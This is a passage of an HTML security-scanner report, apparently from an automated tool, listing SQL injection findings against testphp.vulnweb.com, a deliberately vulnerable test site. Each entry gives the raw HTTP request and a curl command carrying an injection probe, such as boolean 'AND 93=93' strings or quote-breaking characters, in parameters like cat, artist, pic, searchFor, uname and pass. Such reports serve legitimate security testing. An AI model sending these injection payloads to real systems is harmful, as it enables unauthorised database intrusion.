+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?cat=1%20AND%2093%3D93%20AND%2090%3D90 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-5-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%2093%3D93%20AND%2090%3D90&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-5-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-6-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-6-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-6-4">cURL command line</a>
+                            <a href="#tab-vuln-21-6-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-6-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-21-6-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?artist=3%C2%BF%27%22%28 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-6-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?artist=3%C2%BF%27%22%28&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-6-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-7-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-7-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-7-4">cURL command line</a>
+                            <a href="#tab-vuln-21-7-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-7-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-21-7-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?artist=1%20AND%2055%3D55%20AND%2072%3D72 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-7-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?artist=1%20AND%2055%3D55%20AND%2072%3D72&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-7-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-8-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-8-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-8-4">cURL command line</a>
+                            <a href="#tab-vuln-21-8-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-8-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-21-8-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?artist=2%20AND%2070%3D70%20AND%2081%3D81 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-8-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?artist=2%20AND%2070%3D70%20AND%2081%3D81&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-8-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-9-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-9-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-9-4">cURL command line</a>
+                            <a href="#tab-vuln-21-9-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-9-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-9-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=6%C2%BF%27%22%28 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-9-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=6%C2%BF%27%22%28&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-9-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-10-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-10-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-10-4">cURL command line</a>
+                            <a href="#tab-vuln-21-10-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-10-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-10-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=7%20AND%2030%3D30%20AND%2032%3D32 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-10-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=7%20AND%2030%3D30%20AND%2032%3D32&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-10-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-11-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-11-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-11-4">cURL command line</a>
+                            <a href="#tab-vuln-21-11-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-11-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-11-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=2%20AND%2098%3D98%20AND%2097%3D97 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-11-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=2%20AND%2098%3D98%20AND%2097%3D97&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-11-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-12-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-12-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-12-4">cURL command line</a>
+                            <a href="#tab-vuln-21-12-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-12-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-12-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=4%20AND%2018%3D18%20AND%2096%3D96 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-12-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=4%20AND%2018%3D18%20AND%2096%3D96&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-12-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-13-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-13-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-13-4">cURL command line</a>
+                            <a href="#tab-vuln-21-13-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-13-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-13-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=5%20AND%2098%3D98%20AND%2085%3D85 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-13-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=5%20AND%2098%3D98%20AND%2085%3D85&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-13-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-14-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-14-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-14-4">cURL command line</a>
+                            <a href="#tab-vuln-21-14-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-14-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-14-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=1%20AND%2010%3D10%20AND%2084%3D84 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-14-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=1%20AND%2010%3D10%20AND%2084%3D84&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-14-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-15-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-15-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-15-4">cURL command line</a>
+                            <a href="#tab-vuln-21-15-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-15-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-21-15-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=3%20AND%2083%3D83%20AND%2022%3D22 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-15-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=3%20AND%2083%3D83%20AND%2022%3D22&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-15-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /search.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-16-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-16-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-16-4">cURL command line</a>
+                            <a href="#tab-vuln-21-16-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-16-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter test</pre>
+                        </section>
+                        <section id="tab-vuln-21-16-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /search.php?test=query%C2%BF%27%22%28 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-16-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/search.php?test=query%C2%BF%27%22%28&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-16-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /search.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-17-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-17-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-17-4">cURL command line</a>
+                            <a href="#tab-vuln-21-17-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-17-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter test</pre>
+                        </section>
+                        <section id="tab-vuln-21-17-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /search.php?test=query%C2%BF%27%22%28 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/
+                                    <br>
+                                    content-length: 29
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    searchFor=default&amp;goButton=go
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-17-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/search.php?test=query%C2%BF%27%22%28&#34; -e &#34;http://testphp.vulnweb.com/&#34; -d &#34;searchFor=default&amp;goButton=go&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-17-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /search.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-18-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-18-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-18-4">cURL command line</a>
+                            <a href="#tab-vuln-21-18-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-18-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter searchFor</pre>
+                        </section>
+                        <section id="tab-vuln-21-18-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /search.php?test=query HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/
+                                    <br>
+                                    content-length: 42
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    searchFor=query%C2%BF%27%22%28&amp;goButton=go
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-18-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/search.php?test=query&#34; -e &#34;http://testphp.vulnweb.com/&#34; -d &#34;searchFor=query%C2%BF%27%22%28&amp;goButton=go&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-18-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-19-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-19-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-19-4">cURL command line</a>
+                            <a href="#tab-vuln-21-19-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-19-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter uuname</pre>
+                        </section>
+                        <section id="tab-vuln-21-19-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 173
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=default%C2%BF%27%22%28&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-19-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=default%C2%BF%27%22%28&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-19-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /userinfo.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-20-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-20-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-20-4">cURL command line</a>
+                            <a href="#tab-vuln-21-20-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-20-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter uname</pre>
+                        </section>
+                        <section id="tab-vuln-21-20-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /userinfo.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/login.php
+                                    <br>
+                                    content-length: 42
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uname=default%C2%BF%27%22%28&amp;pass=Letm3in_
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-20-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/userinfo.php&#34; -e &#34;http://testphp.vulnweb.com/login.php&#34; -d &#34;uname=default%C2%BF%27%22%28&amp;pass=Letm3in_&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-20-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /userinfo.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-21-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-21-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-21-4">cURL command line</a>
+                            <a href="#tab-vuln-21-21-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-21-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter pass</pre>
+                        </section>
+                        <section id="tab-vuln-21-21-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /userinfo.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/login.php
+                                    <br>
+                                    content-length: 41
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uname=default&amp;pass=default%C2%BF%27%22%28
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-21-4" style="min-height: 124px;" class="is-hidden">
